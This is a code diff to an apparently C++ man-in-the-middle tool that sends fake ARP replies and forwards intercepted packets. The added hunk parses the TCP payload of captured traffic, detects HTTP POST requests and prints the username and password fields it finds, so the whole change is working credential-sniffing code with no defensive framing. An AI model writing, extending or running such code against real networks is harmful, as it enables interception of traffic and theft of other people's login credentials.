@@ -47,6 +47,9 @@ void receive_responses(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8
             }
         }
         // Check if packet is an ICMP packet
+        if (bytes < ETH_HDRLEN + sizeof(struct iphdr)) {
+            continue;  // Not enough data for IP header
+        }
         struct iphdr *iph = (struct iphdr *)(buffer + ETH_HDRLEN);  // Skip the Ethernet header
         if (iph->protocol == IPPROTO_ICMP) {
             // Get the Ethernet header
@@ -59,10 +62,6 @@ void receive_responses(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8
 
             // Change the source MAC to my MAC
             memcpy(eth->h_source, my_mac.data(), ETH_ALEN);
-
-            // Convert iph->saddr to std::array<uint8_t, 4>
-            std::array<uint8_t, 4> ip_addr;
-            memcpy(ip_addr.data(), &iph->saddr, 4);
 
             // If the source IP is src_ip, change the destination MAC to the gateway's MAC
             if (iph->saddr == src_ip) {
@@ -92,26 +91,46 @@ void receive_responses(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8
                     exit(EXIT_FAILURE);
                 }
             }
+        }
+        // Check if packet is a TCP packet
+        if (bytes < ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr)) {
+            continue;  // Not enough data for TCP header
+        }
+        // Get the payload
+        uint8_t *payload = buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr);
+        int payload_length = bytes - (ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr));
 
-#ifdef DEBUG
-            // Print the source IP address
-            printf("Source IP: %d.%d.%d.%d\t\t", iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
-            // Print the source MAC address
-            printf("Source MAC: ");
-            for (i = 0; i < 5; i++) {
-                printf("%02x:", eth->h_source[i]);
-            }
-            printf("%02x\n", eth->h_source[5]);
+        // Check if the payload is an HTTP POST packet
+        const char *http_post = "POST";
+        bool is_http_post = false;
 
-            // Print the destination IP address
-            printf("Destination IP: %d.%d.%d.%d\t\t", iph->daddr & 0xff, (iph->daddr >> 8) & 0xff, (iph->daddr >> 16) & 0xff, (iph->daddr >> 24) & 0xff);
-            // Print the destination MAC address
-            printf("Destination MAC: ");
-            for (i = 0; i < 5; i++) {
-                printf("%02x:", eth->h_dest[i]);
+        if (payload_length >= strlen(http_post) && memcmp(payload, http_post, strlen(http_post)) == 0) {
+            is_http_post = true;
+        }
+
+        if (is_http_post) {
+            // Find the username and password
+            char *username_start = strstr((char *)payload, "Username=");
+            char *password_start = strstr((char *)payload, "Password=");
+            if (username_start && password_start) {
+                char *username_end = strchr(username_start, '&');
+                char *password_end = (char *)payload + payload_length;
+
+                if (!username_end) {
+                    username_end = password_start - 1;
+                }
+
+                // Print the username and password
+                printf("Username: ");
+                for (char *p = username_start + strlen("Username="); p < username_end; p++) {
+                    printf("%c", *p);
+                }
+                printf("\nPassword: ");
+                for (char *p = password_start + strlen("Password="); p < password_end; p++) {
+                    printf("%c", *p);
+                }
+                printf("\n");
             }
-            printf("%02x\n", eth->h_dest[5]);
-#endif
         }
         memset(buffer, 0, IP_MAXPACKET);
     }
@@ -270,10 +289,11 @@ int main(int argc, char **argv) {
 
     // Use a table to save IP-MAC pairs
     std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> ip_mac_pairs;
+
     // Start the thread
     std::thread send_thread(send_fake_arp_replies, sd, std::ref(ip_mac_pairs), src_mac, std::ref(device));
 
-    // Receive ARP responses
+    // Receive responses
     receive_responses(sd, ip_mac_pairs, src_mac, gateway_ip, device);
 
     // Wait for the thread to finish
